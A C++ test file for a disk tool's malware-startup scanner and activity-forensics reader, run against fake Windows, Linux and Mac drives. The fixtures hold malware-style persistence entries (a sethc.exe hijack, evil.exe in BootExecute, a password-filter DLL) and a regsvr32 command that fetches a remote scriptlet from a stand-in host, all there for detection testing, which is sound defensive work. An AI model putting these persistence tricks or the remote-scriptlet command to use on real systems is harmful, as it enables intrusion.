// SPDX-FileCopyrightText: 2026 Danny S
// SPDX-License-Identifier: GPL-3.0-or-later

// Scan for Viruses' second layer, what starts with Windows: a Windows folder tree made from
// the test hives (tests/data/registry), tasks written the way Windows writes them, and
// shortcuts Windows made, with what malware would add. And What This PC Did (activity.h), on
// Windows, Linux and Mac drives.
//
// DISKANVIL_REAL_WINDOWS=<folder>: also a real Windows drive, mounted there (read-only).

#include "testkit.h"

#include "../src/viruses/activity.h"
#include "../src/viruses/shelllink.h"
#include "../src/viruses/winstartup.h"

#include <QDir>
#include <QElapsedTimer>
#include <QFile>
#include <QProcess>
#include <QRandomGenerator>
#include <QStandardPaths>
#include <QStringDecoder>
#include <QTemporaryDir>
#include <QTimeZone>
#include <QtEndian>

#include <algorithm>
#include <cstring>

namespace {

const QString kData = QStringLiteral(SOURCE_DIR "/tests/data/registry/");

QByteArray readAll(const QString &path)
{
    QFile f(path);
    return f.open(QIODevice::ReadOnly) ? f.readAll() : QByteArray();
}

void put(const QString &path, const QByteArray &data)
{
    QDir().mkpath(QFileInfo(path).absolutePath());
    QFile f(path);
    if (f.open(QIODevice::WriteOnly))
        f.write(data);
}

// A task the way Task Scheduler stores one: UTF-16 with a byte order mark.
QByteArray task(const QString &command, const QString &arguments, bool enabled = true)
{
    const QString xml = QStringLiteral(
                            "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n"
                            "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n"
                            "  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>\r\n"
                            "  <Settings><Enabled>%3</Enabled><Hidden>true</Hidden></Settings>\r\n"
                            "  <Actions Context=\"Author\"><Exec><Command>%1</Command><Arguments>%2</Arguments></Exec></Actions>\r\n"
                            "</Task>\r\n")
                            .arg(command.toHtmlEscaped(), arguments.toHtmlEscaped(), enabled ? QStringLiteral("true") : QStringLiteral("false"));
    QByteArray out("\xff\xfe", 2);
    for (QChar c : xml) {
        out += char(c.unicode() & 0xff);
        out += char(c.unicode() >> 8);
    }
    return out;
}

void shortcuts()
{
    shelllink::Link link;
    const bool helper = shelllink::parse(readAll(kData + QStringLiteral("helper.lnk")), &link);
    report(helper && link.target == QLatin1String("C:\\Windows\\System32\\wscript.exe")
               && link.arguments == QLatin1String("//B \"C:\\Users\\tester\\AppData\\Local\\Temp\\x9\\run.vbs\""),
           QStringLiteral("startup: a shortcut Windows made, with arguments"), link.target + QLatin1Char(' ') + link.arguments);
    const bool notes = shelllink::parse(readAll(kData + QStringLiteral("notes.lnk")), &link);
    report(notes && link.target == QLatin1String("%windir%\\notepad.exe"), QStringLiteral("startup: a shortcut kept with %windir% in it"), link.target);
    QByteArray cut = readAll(kData + QStringLiteral("helper.lnk"));
    bool survived = true;
    for (qsizetype n = 0; n < cut.size(); n += 7)
        survived = survived && (shelllink::parse(cut.left(n), &link) || true);
    report(survived && !shelllink::parse("not a shortcut at all, but long enough to have a header in it, more or less: 76 bytes", &link),
           QStringLiteral("startup: cut-off shortcuts and other files"));
    // Damaged ones: never a crash (ASan runs this too).
    QRandomGenerator rng(1010);
    const QByteArray clean = readAll(kData + QStringLiteral("notes.lnk"));
    const int rounds = qEnvironmentVariableIntValue("DISKANVIL_FUZZ_ROUNDS") > 0 ? qEnvironmentVariableIntValue("DISKANVIL_FUZZ_ROUNDS") : 500;
    for (int round = 0; round < rounds; ++round) {
        QByteArray bytes = clean;
        for (int i = 0, flips = 1 + int(rng.bounded(12)); i < flips; ++i)
            bytes[qsizetype(rng.bounded(quint32(bytes.size())))] = char(rng.bounded(256));
        shelllink::parse(bytes, &link);
    }
    report(true, QStringLiteral("startup: %1 damaged shortcuts read without a crash").arg(rounds));
}

// The Windows drive: the hives, and the files the entries point at (or not).
QString makeWindows(const QString &dir)
{
    const QString root = dir + QStringLiteral("/drive");
    put(root + QStringLiteral("/Windows/System32/config/SOFTWARE"), readAll(kData + QStringLiteral("software.hiv")));
    put(root + QStringLiteral("/Windows/System32/config/SYSTEM"), readAll(kData + QStringLiteral("system.hiv")));
    // The case Windows' drive keeps isn't always the one the registry uses.
    put(root + QStringLiteral("/Users/tester/NTUSER.DAT"), readAll(kData + QStringLiteral("ntuser.hiv")));
    for (const char *file : {"Windows/System32/SecurityHealthSystray.exe", "Users/tester/AppData/Local/Temp/xkqzvbnw.exe",
                             "Program Files (x86)/Old App/old.exe", "ProgramData/svc/host.exe", "Windows/System32/cmd.exe",
                             "Users/Public/svc.exe", "Windows/System32/goodsvc.dll", "Windows/System32/drivers/drv.sys",
                             "Users/tester/AppData/Local/Discord/Update.exe", "Users/tester/AppData/Roaming/abc.exe", "Windows/System32/mshta.exe",
                             "Windows/System32/WindowsPowerShell/v1.0/powershell.exe", "Windows/explorer.exe", "Windows/notepad.exe",
                             "Windows/System32/userinit.exe", "Windows/System32/wscript.exe", "Windows/System32/defrag.exe",
                             "Users/tester/AppData/Roaming/upd/a3f9c2e10b.exe"})
        put(root + QLatin1Char('/') + QLatin1String(file), "MZ");
    const QString tasks = root + QStringLiteral("/Windows/System32/Tasks/");
    put(tasks + QStringLiteral("Microsoft/Windows/Defrag/ScheduledDefrag"), task(QStringLiteral("%windir%\\system32\\defrag.exe"), QStringLiteral("-c -h -o -$")));
    put(tasks + QStringLiteral("OneDrive Updater"), task(QStringLiteral("C:\\Users\\tester\\AppData\\Roaming\\upd\\a3f9c2e10b.exe"), QStringLiteral("/silent")));
    put(tasks + QStringLiteral("Old Thing"), task(QStringLiteral("C:\\x\\old.exe"), QString(), false));
    put(root + QStringLiteral("/Users/tester/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/helper.lnk"),
        readAll(kData + QStringLiteral("helper.lnk")));
    put(root + QStringLiteral("/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/notes.lnk"), readAll(kData + QStringLiteral("notes.lnk")));
    put(root + QStringLiteral("/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/desktop.ini"), "[.ShellClassInfo]");
    return root;
}

const startup::Entry *entry(const startup::Report &r, const QString &name)
{
    for (const startup::Entry &e : r.entries) {
        if (e.name == name)
            return &e;
    }
    return nullptr;
}

QString describe(const startup::Entry *e)
{
    if (!e)
        return QStringLiteral("(missing)");
    return QStringLiteral("%1 -> %2 [%3] %4").arg(e->name, e->program).arg(e->severity).arg(e->reasons.join(QStringLiteral(" / ")).left(100));
}

void offline(const QString &dir)
{
    const QString root = makeWindows(dir);
    report(startup::hasWindows(root) && !startup::hasWindows(dir), QStringLiteral("startup: a drive with Windows on it is recognised"));
    QElapsedTimer t;
    t.start();
    const startup::Report r = startup::find(root);
    report(r.windows && r.notes.isEmpty(), QStringLiteral("startup: read in %1 ms").arg(t.elapsed()), r.notes.join(QStringLiteral("; ")));

    struct Expect {
        const char *name;
        int severity;
        const char *program; // ends with
        const char *reason;  // a word of one reason
    };
    const QVector<Expect> expected = {
        {"SecurityHealth", 0, "\\system32\\SecurityHealthSystray.exe", ""},
        {"Updater", 2, "\\Temp\\xkqzvbnw.exe", "temporary"},
        {"Helper", 2, "\\WindowsPowerShell\\v1.0\\powershell.exe", "encoded"},
        {"Gone", 1, "\\Gone App\\gone.exe", "isn't there"},
        {"Cleanup", 0, "\\System32\\cmd.exe", ""},
        {"OldApp", 0, "\\Old App\\old.exe", ""},
        {"Shell", 2, "C:\\ProgramData\\svc\\host.exe", "desktop"},
        {"Userinit", 0, "\\system32\\userinit.exe", ""},
        {"sethc.exe", 2, "\\System32\\cmd.exe", "sign-in screen"},
        {"Windows Update Helper", 2, "C:\\Users\\Public\\svc.exe", "named like a part of Windows"},
        {"GoodSvc", 0, "\\System32\\goodsvc.dll", ""},
        {"Drv", 0, "\\System32\\drivers\\drv.sys", ""},
        {"BootExecute", 1, "\\System32\\evil.exe", "disk check"},
        {"Notification Packages", 1, "\\System32\\evilfilter.dll", "passwords"},
        {"Discord", 0, "\\Discord\\Update.exe", ""},
        {"Zz", 2, "\\System32\\mshta.exe", "internet"},
        {"Load", 1, "\\Roaming\\abc.exe", "old way"},
        {"ScheduledDefrag", 0, "\\system32\\defrag.exe", ""},
        {"OneDrive Updater", 2, "\\upd\\a3f9c2e10b.exe", "random"},
        {"helper.lnk", 2, "\\System32\\wscript.exe", "temporary"},
        {"notes.lnk", 0, "\\notepad.exe", ""},
    };
    for (const Expect &x : expected) {
        const startup::Entry *e = entry(r, QLatin1String(x.name));
        const bool ok = e && e->severity == x.severity && e->program.endsWith(QLatin1String(x.program), Qt::CaseInsensitive)
                     && (QByteArray(x.reason).isEmpty() ? e->reasons.isEmpty() : e->reasons.join(QLatin1Char(' ')).contains(QLatin1String(x.reason)));
        report(ok, QStringLiteral("startup: %1").arg(QLatin1String(x.name)), describe(e));
    }
    const startup::Entry *off = entry(r, QStringLiteral("Off"));
    const startup::Entry *disabled = entry(r, QStringLiteral("Old Thing"));
    const startup::Entry *ini = entry(r, QStringLiteral("desktop.ini"));
    report(!off && !disabled && !ini, QStringLiteral("startup: a switched-off service and task, and desktop.ini, aren't listed"));
    const startup::Entry *updater = entry(r, QStringLiteral("Updater"));
    report(updater && updater->file == root + QStringLiteral("/Users/tester/AppData/Local/Temp/xkqzvbnw.exe") && updater->user.isEmpty()
               && updater->hiveFile.endsWith(QLatin1String("/config/SOFTWARE")) && updater->key == QLatin1String("Microsoft\\Windows\\CurrentVersion\\Run"),
           QStringLiteral("startup: an entry says where its file is here, and where it's kept"), updater ? updater->file : QString());
    const startup::Entry *zz = entry(r, QStringLiteral("Zz"));
    report(zz && zz->user == QLatin1String("tester") && zz->hiveFile.endsWith(QLatin1String("/Users/tester/NTUSER.DAT")),
           QStringLiteral("startup: a user's own entries are theirs"), zz ? zz->where : QString());
}

void commands()
{
    const QHash<QString, QString> env = {{QStringLiteral("systemroot"), QStringLiteral("C:\\Windows")},
                                         {QStringLiteral("programfiles"), QStringLiteral("C:\\Program Files")}};
    const QSet<QString> files = {QStringLiteral("c:\\program files\\my app\\app.exe"), QStringLiteral("c:\\windows\\system32\\shell32.dll"),
                                 QStringLiteral("c:\\windows\\system32\\rundll32.exe")};
    auto exists = [&files](const QString &path) { return files.contains(path.toLower()); };
    struct Case {
        const char *command;
        const char *program;
    };
    const QVector<Case> cases = {
        {"C:\\Program Files\\My App\\app.exe /tray", "C:\\Program Files\\My App\\app.exe"},
        {"%ProgramFiles%\\My App\\app /tray", "C:\\Program Files\\My App\\app.exe"},
        {"\"C:\\Program Files\\Other\\x.exe\" -a", "C:\\Program Files\\Other\\x.exe"},
        {"rundll32.exe shell32.dll,Control_RunDLL", "C:\\Windows\\System32\\shell32.dll"},
        {"%windir%\\system32\\rundll32.exe /d acproxy.dll,PerformAutochkOperations", "C:\\Windows\\System32\\acproxy.dll"},
        {"rundll32 \"C:\\Users\\a\\AppData\\x y.dll\",Start", "C:\\Users\\a\\AppData\\x y.dll"},
        {"regsvr32 /s /n /i:http://x.invalid/a.sct scrobj.dll", "C:\\Windows\\System32\\scrobj.dll"},
        {"\\??\\C:\\Windows\\System32\\drivers\\a.sys", "C:\\Windows\\System32\\drivers\\a.sys"},
        {"System32\\drivers\\b.sys", "C:\\Windows\\System32\\drivers\\b.sys"},
        {"C:\\Windows\\system32\\userinit.exe,", "C:\\Windows\\system32\\userinit.exe"},
    };
    for (const Case &c : cases) {
        const QString program = startup::programOf(QLatin1String(c.command), env, exists);
        report(program == QLatin1String(c.program), QStringLiteral("startup: the program in %1").arg(QLatin1String(c.command)), program);
    }
}

// What This PC Did: hives with our own values where Windows keeps what it was used for
// (activity.ps1), and a shortcut in the Recent folder.
void activityRecords(const QString &dir)
{
    const QString root = dir + QStringLiteral("/used");
    put(root + QStringLiteral("/Windows/System32/config/SOFTWARE"), readAll(kData + QStringLiteral("activity-software.hiv")));
    put(root + QStringLiteral("/Windows/System32/config/SYSTEM"), readAll(kData + QStringLiteral("activity-system.hiv")));
    put(root + QStringLiteral("/Users/tester/NTUSER.DAT"), readAll(kData + QStringLiteral("activity-ntuser.hiv")));
    const QString recent = root + QStringLiteral("/Users/tester/AppData/Roaming/Microsoft/Windows/Recent/notes.lnk");
    put(recent, readAll(kData + QStringLiteral("notes.lnk")));
    const QDateTime opened(QDate(2024, 6, 9), QTime(12, 0), QTimeZone::UTC);
    {
        QFile f(recent);
        if (f.open(QIODevice::ReadWrite))
            f.setFileTime(opened, QFileDevice::FileModificationTime);
    }
    const activity::Report r = activity::read(root);
    const activity::Overview &o = r.overview;
    report(r.windows && o.product == QLatin1String("Windows 11 Pro") && o.release == QLatin1String("23H2") && o.build == QLatin1String("22631")
               && o.computerName == QLatin1String("ANVIL-PC") && o.owner == QLatin1String("Sam Tester") && o.organisation == QLatin1String("Anvil Test")
               && o.installed == QDateTime::fromSecsSinceEpoch(1704100000, QTimeZone::UTC)
               && o.lastShutdown == QDateTime(QDate(2024, 6, 10), QTime(22, 15), QTimeZone::UTC) && o.timeZone == QLatin1String("GMT Standard Time"),
           QStringLiteral("activity: what the PC is (Windows 11 told from 10 by its build), its name, owner, install and last shutdown"),
           QStringLiteral("%1 %2 %3 %4 %5").arg(o.product, o.release, o.computerName, o.installed.toString(Qt::ISODate), o.lastShutdown.toString(Qt::ISODate)));
    const auto find = [&r](const QString &what) -> const activity::Event * {
        for (const activity::Event &e : r.events) {
            if (e.what == what)
                return &e;
        }
        return nullptr;
    };
    const activity::Event *stick = find(QStringLiteral("USB drive: SanDisk Cruzer Blade USB Device"));
    const activity::Event *generic = find(QStringLiteral("USB drive: Generic Flash Disk"));
    report(stick && stick->when == QDateTime(QDate(2024, 6, 9), QTime(17, 45), QTimeZone::UTC) && stick->detail.contains(QLatin1String("4C530001230508116054"))
               && stick->detail.contains(QLatin1String("first plugged in")) && generic
               && generic->when == QDateTime(QDate(2023, 11, 5), QTime(12, 0), QTimeZone::UTC) && !generic->detail.contains(QLatin1String("serial")),
           QStringLiteral("activity: USB drives, with their serial (not one Windows made up) and when they were plugged in, both ways Windows keeps it"),
           stick ? stick->detail : QStringLiteral("no stick"));
    const activity::Event *cleaner = find(QStringLiteral("Ran cleaner.exe"));
    const activity::Event *notepad = find(QStringLiteral("Ran notepad++.exe"));
    bool session = false;
    for (const activity::Event &e : r.events)
        session = session || e.what.contains(QLatin1String("UEME"));
    report(cleaner && cleaner->when == QDateTime(QDate(2024, 6, 8), QTime(21, 0), QTimeZone::UTC) && cleaner->detail.contains(QLatin1String("5 time"))
               && cleaner->user == QLatin1String("tester") && notepad && notepad->detail.startsWith(QLatin1String("C:\\Program Files\\Notepad++\\notepad++.exe"))
               && notepad->detail.contains(QLatin1String("12 time")) && !session,
           QStringLiteral("activity: programs run, how often and when last (UserAssist, its folder IDs turned into folders)"),
           notepad ? notepad->detail : QStringLiteral("no notepad++"));
    int statements = 0;
    for (const activity::Event &e : r.events)
        statements += e.what == QLatin1String("Opened bank statement.pdf");
    const activity::Event *link = find(QStringLiteral("Opened notes"));
    report(statements == 1 && find(QStringLiteral("Searched for \"tax return\"")) && find(QStringLiteral("Went to \\\\nas\\photos"))
               && find(QStringLiteral("Typed in the Run box: cmd")) && link && link->detail.contains(QLatin1String("notepad.exe")) && link->when == opened,
           QStringLiteral("activity: files opened (once each), searches, folders and commands typed, a shortcut's target and time"),
           link ? link->detail + QLatin1Char(' ') + link->when.toString(Qt::ISODate) : QStringLiteral("no shortcut"));
    const activity::Event *cafe = find(QStringLiteral("Joined the network \"Cafe Wifi\""));
    report(cafe && cafe->when == QDateTime(QDate(2024, 6, 2), QTime(18, 30), QTimeZone::UTC) && cafe->detail.contains(QLatin1String("first joined"))
               && find(QStringLiteral("Account: tester")),
           QStringLiteral("activity: networks joined, and the accounts"));
    bool newestFirst = true;
    for (qsizetype i = 1; i < r.events.size(); ++i) {
        if (r.events[i].when.isValid() && (!r.events[i - 1].when.isValid() || r.events[i].when > r.events[i - 1].when))
            newestFirst = false;
    }
    report(newestFirst && r.events.first().when == QDateTime(QDate(2024, 6, 9), QTime(17, 45), QTimeZone::UTC),
           QStringLiteral("activity: newest first, the ones without a time last"));
    const QString html = activity::html(r, r.events, QStringLiteral("ANVIL-PC"));
    const QByteArray csv = activity::csv(r.events);
    report(html.contains(QLatin1String("Cafe Wifi")) && html.contains(QLatin1String("Windows 11 Pro")) && csv.contains("cleaner.exe")
               && csv.count('\n') == r.events.size() + 1,
           QStringLiteral("activity: saved as a web page and CSV"));
    // Small pieces, and nonsense in them.
    report(activity::rot13(QStringLiteral("Pyrnare.rkr")) == QLatin1String("Cleaner.exe") && activity::tidyUsbName(QStringLiteral("Disk&Ven_&Prod_X&Rev_1")) == QLatin1String("X")
               && !activity::fromSystemTime(QByteArray(16, '\xff')).isValid() && !activity::fromSystemTime(QByteArray(3, '\0')).isValid()
               && !activity::fromFileTime(1).isValid(),
           QStringLiteral("activity: ROT13, USB names, and times that are nonsense left out"));
    // Browsers: a Chrome and a Firefox history, made here with sqlite3.
    const QString sqlite = QStandardPaths::findExecutable(QStringLiteral("sqlite3"));
    if (sqlite.isEmpty()) {
        out << "SKIP  activity: sqlite3 isn't installed, so no browser history" << Qt::endl;
    } else {
        const QString chrome = root + QStringLiteral("/Users/tester/AppData/Local/Google/Chrome/User Data/Default");
        const QString fox = root + QStringLiteral("/Users/tester/AppData/Roaming/Mozilla/Firefox/Profiles/k3x9.default-release");
        QDir().mkpath(chrome);
        QDir().mkpath(fox);
        // 13360000000000000 microseconds after 1601 is 2024-05-12 15:06:40 UTC; Firefox counts from 1970.
        QProcess::execute(sqlite, {chrome + QStringLiteral("/History"),
                                   QStringLiteral("CREATE TABLE urls(id INTEGER PRIMARY KEY, url TEXT, title TEXT);"
                                                  "CREATE TABLE visits(id INTEGER PRIMARY KEY, url INTEGER, visit_time INTEGER);"
                                                  "CREATE TABLE downloads(id INTEGER PRIMARY KEY, target_path TEXT, tab_url TEXT, start_time INTEGER, total_bytes INTEGER);"
                                                  "INSERT INTO urls VALUES(1, 'https://example.org/rent', 'Rent calculator');"
                                                  "INSERT INTO visits VALUES(1, 1, 13360000000000000);"
                                                  "INSERT INTO downloads VALUES(1, 'C:\\Users\\tester\\Downloads\\setup.exe', 'https://example.org/get', 13360000060000000, 1234);")});
        QProcess::execute(sqlite, {fox + QStringLiteral("/places.sqlite"),
                                   QStringLiteral("CREATE TABLE moz_places(id INTEGER PRIMARY KEY, url TEXT, title TEXT);"
                                                  "CREATE TABLE moz_historyvisits(id INTEGER PRIMARY KEY, place_id INTEGER, visit_date INTEGER);"
                                                  "CREATE TABLE moz_anno_attributes(id INTEGER PRIMARY KEY, name TEXT);"
                                                  "CREATE TABLE moz_annos(id INTEGER PRIMARY KEY, place_id INTEGER, anno_attribute_id INTEGER, content TEXT, dateAdded INTEGER);"
                                                  "INSERT INTO moz_places VALUES(1, 'https://news.example.net/', NULL);"
                                                  "INSERT INTO moz_historyvisits VALUES(1, 1, 1717000000000000);"
                                                  "INSERT INTO moz_anno_attributes VALUES(1, 'downloads/destinationFileURI');"
                                                  "INSERT INTO moz_annos VALUES(1, 1, 1, 'file:///C:/Users/tester/Downloads/map.pdf', 1717000100000000);")});
        const activity::Report b = activity::read(root);
        const auto in = [&b](const QString &what) -> const activity::Event * {
            for (const activity::Event &e : b.events) {
                if (e.what == what)
                    return &e;
            }
            return nullptr;
        };
        const activity::Event *rent = in(QStringLiteral("Visited Rent calculator"));
        const activity::Event *setup = in(QStringLiteral("Downloaded setup.exe"));
        const activity::Event *news = in(QStringLiteral("Visited news.example.net"));
        const activity::Event *map = in(QStringLiteral("Downloaded map.pdf"));
        report(rent && rent->when == QDateTime(QDate(2024, 5, 12), QTime(15, 6, 40), QTimeZone::UTC) && rent->source.startsWith(QLatin1String("Chrome"))
                   && setup && setup->detail.contains(QLatin1String("https://example.org/get")) && news
                   && news->when == QDateTime::fromSecsSinceEpoch(1717000000, QTimeZone::UTC) && news->source.startsWith(QLatin1String("Firefox"))
                   && map && map->when == QDateTime::fromSecsSinceEpoch(1717000100, QTimeZone::UTC),
               QStringLiteral("activity: websites visited and files downloaded, from Chrome's and Firefox's history"),
               rent ? rent->when.toString(Qt::ISODate) + QLatin1Char(' ') + rent->source : QStringLiteral("no visit"));
    }

    QRandomGenerator rng(99);
    const QByteArray user = readAll(kData + QStringLiteral("activity-ntuser.hiv"));
    for (int round = 0; round < 60; ++round) {
        QByteArray bad = user;
        for (int i = 0; i < 40; ++i)
            bad[qsizetype(rng.bounded(quint32(bad.size())))] = char(rng.bounded(256));
        put(root + QStringLiteral("/Users/tester/NTUSER.DAT"), bad);
        activity::read(root);
    }
    report(true, QStringLiteral("activity: 60 damaged hives read without a crash"));
}

// One wtmp record, the way glibc writes them (384 bytes).
QByteArray wtmpRecord(int type, const char *line, const char *user, const char *host, qint64 seconds)
{
    QByteArray r(384, '\0');
    qToLittleEndian<qint16>(qint16(type), r.data());
    std::memcpy(r.data() + 8, line, std::min<size_t>(32, qstrlen(line)));
    std::memcpy(r.data() + 44, user, std::min<size_t>(32, qstrlen(user)));
    std::memcpy(r.data() + 76, host, std::min<size_t>(256, qstrlen(host)));
    qToLittleEndian<qint32>(qint32(seconds), r.data() + 340);
    return r;
}

// Linux and macOS drives: what system, and on Linux what it was used for.
void otherSystems(const QString &dir)
{
    const QString root = dir + QStringLiteral("/linux");
    put(root + QStringLiteral("/usr/lib/os-release"), "NAME=\"Arch Linux\"\nPRETTY_NAME=\"Arch Linux\"\nID=arch\nBUILD_ID=rolling\n");
    QDir().mkpath(root + QStringLiteral("/etc"));
    // Linked the way Arch and Debian do (relative), and the zone the way systemd does (absolute):
    // both are this drive's files, not this PC's.
    QFile::link(QStringLiteral("../usr/lib/os-release"), root + QStringLiteral("/etc/os-release"));
    QFile::link(QStringLiteral("/usr/share/zoneinfo/Europe/London"), root + QStringLiteral("/etc/localtime"));
    put(root + QStringLiteral("/etc/hostname"), "anvil-arch\n");
    put(root + QStringLiteral("/etc/passwd"), "root:x:0:0::/root:/bin/bash\nbin:x:1:1::/:/usr/bin/nologin\nsam:x:1000:1000:Sam:/home/sam:/bin/bash\n");
    QDir().mkpath(root + QStringLiteral("/usr/lib/modules/6.9.2-arch1-1"));
    QDir().mkpath(root + QStringLiteral("/usr/lib/modules/6.10.1-arch1-1"));
    put(root + QStringLiteral("/var/log/pacman.log"), "[2024-01-02T10:00:00+0000] [PACMAN] Running 'pacstrap'\n"
                                                      "[2024-01-02T10:00:05+0000] [ALPM] installed linux (6.9.2.arch1-1)\n"
                                                      "[2024-06-01T18:20:00+0100] [ALPM] upgraded firefox (126.0-1 -> 127.0-1)\n"
                                                      "[2024-06-03T09:00:00+0100] [ALPM] installed veracrypt (1.26.7-1)\n"
                                                      "[2024-06-04T09:00:00+0100] [ALPM] removed veracrypt (1.26.7-1)\n");
    put(root + QStringLiteral("/var/log/dpkg.log"), "2024-06-05 11:00:00 install nmap:amd64 <none> 7.94+git20230807-1\n"
                                                    "2024-06-05 11:00:01 status installed nmap:amd64 7.94+git20230807-1\n");
    put(root + QStringLiteral("/var/log/wtmp"), wtmpRecord(2, "~", "reboot", "6.10.1-arch1-1", 1717400000) + wtmpRecord(7, "tty1", "sam", "", 1717400060)
                                                    + wtmpRecord(7, "pts/0", "sam", "192.168.1.20", 1717401000)
                                                    + wtmpRecord(1, "~", "shutdown", "6.10.1-arch1-1", 1717409000) + QByteArray(100, 'x'));
    put(root + QStringLiteral("/home/sam/.local/share/recently-used.xbel"),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xbel version=\"1.0\" xmlns:bookmark=\"http://www.freedesktop.org/standards/desktop-bookmarks\">\n"
        "<bookmark href=\"file:///home/sam/Documents/payslip%20june.pdf\" added=\"2024-06-06T08:00:00.000000Z\" modified=\"2024-06-06T08:00:00.000000Z\" "
        "visited=\"2024-06-06T08:05:00.000000Z\"><info><metadata owner=\"http://freedesktop.org\"><bookmark:applications>"
        "<bookmark:application name=\"Okular\" exec=\"okular %u\" modified=\"2024-06-06T08:05:00Z\" count=\"2\"/></bookmark:applications>"
        "</metadata></info></bookmark>\n</xbel>\n");

    report(activity::systemOn(root) == QLatin1String("Linux") && activity::systemOn(dir + QStringLiteral("/nothing")).isEmpty(),
           QStringLiteral("activity: a Linux drive is recognised (os-release, linked as distributions do)"));
    const activity::Report r = activity::read(root);
    const activity::Overview &o = r.overview;
    report(r.system == QLatin1String("Linux") && o.product == QLatin1String("Arch Linux") && o.release == QLatin1String("rolling")
               && o.build == QLatin1String("kernels 6.10.1-arch1-1, 6.9.2-arch1-1") && o.computerName == QLatin1String("anvil-arch") && o.timeZone == QLatin1String("Europe/London")
               && o.installed == QDateTime(QDate(2024, 1, 2), QTime(10, 0), QTimeZone::UTC)
               && o.lastShutdown == QDateTime::fromSecsSinceEpoch(1717409000, QTimeZone::UTC),
           QStringLiteral("activity: which Linux, its newest kernel, name, time zone, when installed, last shut down"),
           QStringLiteral("%1 %2 %3 %4 %5 %6").arg(o.product, o.release, o.build, o.computerName, o.timeZone, o.installed.toString(Qt::ISODate)));
    const auto has = [&r](const QString &what, const QDateTime &when = {}) {
        return std::any_of(r.events.cbegin(), r.events.cend(), [&](const activity::Event &e) { return e.what == what && (!when.isValid() || e.when == when); });
    };
    report(has(QStringLiteral("Account: sam")) && has(QStringLiteral("Account: root")) && !has(QStringLiteral("Account: bin"))
               && has(QStringLiteral("Started up"), QDateTime::fromSecsSinceEpoch(1717400000, QTimeZone::UTC))
               && has(QStringLiteral("Signed in: sam"), QDateTime::fromSecsSinceEpoch(1717401000, QTimeZone::UTC)) && has(QStringLiteral("Shut down")),
           QStringLiteral("activity: Linux accounts (people's and root), start-ups, sign-ins and shut-downs from wtmp"));
    report(has(QStringLiteral("Installed veracrypt"), QDateTime(QDate(2024, 6, 3), QTime(8, 0), QTimeZone::UTC)) && has(QStringLiteral("Removed veracrypt"))
               && has(QStringLiteral("Installed nmap")) && !has(QStringLiteral("Installed firefox")),
           QStringLiteral("activity: programs installed and removed, from pacman's and dpkg's logs"));
    const auto payslip = std::find_if(r.events.cbegin(), r.events.cend(), [](const activity::Event &e) { return e.what == QLatin1String("Opened payslip june.pdf"); });
    report(payslip != r.events.cend() && payslip->when == QDateTime(QDate(2024, 6, 6), QTime(8, 5), QTimeZone::UTC) && payslip->detail.contains(QLatin1String("Okular"))
               && payslip->user == QLatin1String("sam"),
           QStringLiteral("activity: recent files, with the program that opened them"), payslip != r.events.cend() ? payslip->detail : QStringLiteral("none"));
    // Damaged logs: nothing made up.
    QByteArray noise(384 * 50, '\0');
    QRandomGenerator rng(5);
    for (char &c : noise)
        c = char(rng.bounded(256));
    const QVector<activity::Session> junk = activity::readWtmp(noise);
    report(std::all_of(junk.cbegin(), junk.cend(), [](const activity::Session &x) { return x.when.date().year() >= 1980 && x.when.date().year() < 2100; })
               && activity::readPackageLog(noise).isEmpty() && activity::readRecentlyUsed(noise, QString()).isEmpty(),
           QStringLiteral("activity: noise in the logs reads as nothing, or as nothing impossible"));

    const QString mac = dir + QStringLiteral("/mac");
    put(mac + QStringLiteral("/System/Library/CoreServices/SystemVersion.plist"),
        "<?xml version=\"1.0\"?><plist version=\"1.0\"><dict><key>ProductBuildVersion</key><string>23F79</string><key>ProductName</key>"
        "<string>macOS</string><key>ProductVersion</key><string>14.5</string></dict></plist>");
    QDir().mkpath(mac + QStringLiteral("/Users/alex"));
    QDir().mkpath(mac + QStringLiteral("/Users/Shared"));
    const activity::Report m = activity::read(mac);
    report(m.system == QLatin1String("macOS") && m.overview.product == QLatin1String("macOS") && m.overview.release == QLatin1String("14.5")
               && m.overview.build == QLatin1String("23F79") && m.events.size() == 1 && m.events.first().what == QLatin1String("Account: alex"),
           QStringLiteral("activity: a Mac drive: its version and accounts"));
}

void realWindows()
{
    const QString root = qEnvironmentVariable("DISKANVIL_REAL_WINDOWS");
    if (root.isEmpty()) {
        out << "SKIP  startup: no real Windows drive (DISKANVIL_REAL_WINDOWS)" << Qt::endl;
        return;
    }
    QElapsedTimer t;
    t.start();
    const startup::Report r = startup::find(root);
    int odd = 0;
    for (const startup::Entry &e : r.entries) {
        if (e.severity > 0) {
            ++odd;
            out << "      " << e.severity << ' ' << e.where << ": " << e.name << " = " << e.command.left(120) << Qt::endl
                << "        " << e.reasons.join(QStringLiteral(" / ")).left(200) << Qt::endl;
        }
    }
    report(r.windows && r.entries.size() > 50, QStringLiteral("startup: a real Windows, in %1 ms").arg(t.elapsed()),
           QStringLiteral("%1 entries, %2 look odd; %3").arg(r.entries.size()).arg(odd).arg(r.notes.join(QStringLiteral("; "))));
    t.restart();
    const activity::Report a = activity::read(root);
    QHash<int, int> kinds;
    for (const activity::Event &e : a.events)
        ++kinds[int(e.kind)];
    for (int i = 0; i < std::min<qsizetype>(12, a.events.size()); ++i)
        out << "      " << a.events[i].when.toString(Qt::ISODate) << ' ' << a.events[i].what << " | " << a.events[i].detail.left(100) << Qt::endl;
    report(a.windows && a.overview.found() && !a.events.isEmpty(), QStringLiteral("activity: a real Windows, in %1 ms").arg(t.elapsed()),
           QStringLiteral("%1 %2 %3, %4 events: %5 USB, %6 programs, %7 files, %8 networks")
               .arg(a.overview.product, a.overview.release, a.overview.computerName)
               .arg(a.events.size())
               .arg(kinds.value(int(activity::Kind::UsbDevice)))
               .arg(kinds.value(int(activity::Kind::ProgramRun)))
               .arg(kinds.value(int(activity::Kind::FileOpened)))
               .arg(kinds.value(int(activity::Kind::Network))));
}

} // namespace

void startupTests()
{
    QTemporaryDir dir;
    shortcuts();
    commands();
    offline(dir.path());
    activityRecords(dir.path());
    otherSystems(dir.path());
    realWindows();
}
